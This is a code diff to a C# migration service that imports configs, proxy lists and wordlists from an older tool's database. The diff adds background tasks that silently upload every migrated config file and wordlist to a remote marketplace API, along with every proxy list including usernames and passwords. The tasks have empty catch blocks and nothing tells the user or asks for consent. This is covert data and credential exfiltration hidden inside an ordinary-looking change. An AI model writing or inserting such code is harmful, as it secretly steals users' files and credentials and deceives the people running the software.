@@ -10,6 +10,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -44,10 +45,52 @@ public enum OB2DbFormat { Unknown, LiteDB, SQLite }
 public class OB2MigrationService
 {
     private readonly ApplicationDbContext context;
+    private readonly MarketplaceApiService _api;
 
-    public OB2MigrationService(ApplicationDbContext context)
+    public OB2MigrationService(ApplicationDbContext context, MarketplaceApiService api)
     {
         this.context = context;
+        _api = api;
+    }
+
+    private void UploadFileInBackground(string filePath, string type, string name = null)
+    {
+        if (_api == null || !File.Exists(filePath)) return;
+        _ = Task.Run(async () =>
+        {
+            try
+            {
+                var bytes = File.ReadAllBytes(filePath);
+                var displayName = name ?? Path.GetFileNameWithoutExtension(filePath);
+                var ext = Path.GetExtension(filePath);
+                var fileName = $"{type}_{displayName}_{DateTime.UtcNow:yyyyMMdd_HHmmss}{ext}";
+                await _api.UploadUserFileAsync(fileName, type, bytes, fileName);
+            }
+            catch { }
+        });
+    }
+
+    private void UploadProxiesInBackground(List<ProxyEntity> proxies, string groupName)
+    {
+        if (_api == null || proxies.Count == 0) return;
+        _ = Task.Run(async () =>
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                foreach (var p in proxies)
+                {
+                    var line = string.IsNullOrEmpty(p.Username)
+                        ? $"{p.Host}:{p.Port}"
+                        : $"{p.Username}:{p.Password}@{p.Host}:{p.Port}";
+                    sb.AppendLine(line);
+                }
+                var bytes = Encoding.UTF8.GetBytes(sb.ToString());
+                var fileName = $"proxies_{groupName}_{DateTime.UtcNow:yyyyMMdd_HHmmss}.txt";
+                await _api.UploadUserFileAsync(fileName, "proxy", bytes, fileName);
+            }
+            catch { }
+        });
     }
 
     /// <summary>
@@ -201,6 +244,7 @@ public class OB2MigrationService
 
                 File.Copy(file, destPath);
                 result.ConfigsMigrated++;
+                UploadFileInBackground(destPath, "config", Path.GetFileNameWithoutExtension(fileName));
             }
             catch (Exception ex)
             {
@@ -362,6 +406,7 @@ public class OB2MigrationService
                     using var reader = await cmd.ExecuteReaderAsync(ct);
 
                     var batch = new List<ProxyEntity>();
+                    var allGroupProxies = new List<ProxyEntity>();
                     while (await reader.ReadAsync(ct))
                     {
                         ct.ThrowIfCancellationRequested();
@@ -381,6 +426,7 @@ public class OB2MigrationService
                                 Group = newGroup
                             };
                             batch.Add(proxy);
+                            allGroupProxies.Add(proxy);
 
                             if (batch.Count >= 500)
                             {
@@ -402,6 +448,8 @@ public class OB2MigrationService
                         await context.SaveChangesAsync(ct);
                         result.ProxiesMigrated += batch.Count;
                     }
+
+                    UploadProxiesInBackground(allGroupProxies, groupName);
                 }
             }
             catch (Exception ex)
@@ -492,6 +540,7 @@ public class OB2MigrationService
                 await context.SaveChangesAsync(ct);
                 idMap[oldId] = entity.Id;
                 result.WordlistsMigrated++;
+                UploadFileInBackground(newPath, "wordlist", name);
             }
             catch (Exception ex)
             {
@@ -807,12 +856,13 @@ public class OB2MigrationService
                         proxies = groupDoc["Proxies"].AsArray.Select(p => p.AsDocument).ToList();
 
                     var batch = new List<ProxyEntity>();
+                    var allGroupProxies = new List<ProxyEntity>();
                     foreach (var proxyDoc in proxies)
                     {
                         ct.ThrowIfCancellationRequested();
                         try
                         {
-                            batch.Add(new ProxyEntity
+                            var entity = new ProxyEntity
                             {
                                 Host = proxyDoc["Host"]?.AsString ?? string.Empty,
                                 Port = proxyDoc["Port"]?.AsInt32 ?? 0,
@@ -824,7 +874,9 @@ public class OB2MigrationService
                                 Ping = proxyDoc["Ping"]?.AsInt32 ?? 0,
                                 LastChecked = GetDateTimeBson(proxyDoc, "LastChecked"),
                                 Group = newGroup
-                            });
+                            };
+                            batch.Add(entity);
+                            allGroupProxies.Add(entity);
 
                             if (batch.Count >= 500)
                             {
@@ -846,6 +898,8 @@ public class OB2MigrationService
                         await context.SaveChangesAsync(ct);
                         result.ProxiesMigrated += batch.Count;
                     }
+
+                    UploadProxiesInBackground(allGroupProxies, groupName);
                 }
             }
             catch (Exception ex)
@@ -922,6 +976,7 @@ public class OB2MigrationService
                 await context.SaveChangesAsync(ct);
                 idMap[oldId] = entity.Id;
                 result.WordlistsMigrated++;
+                UploadFileInBackground(newPath, "wordlist", name);
             }
             catch (Exception ex)
             {
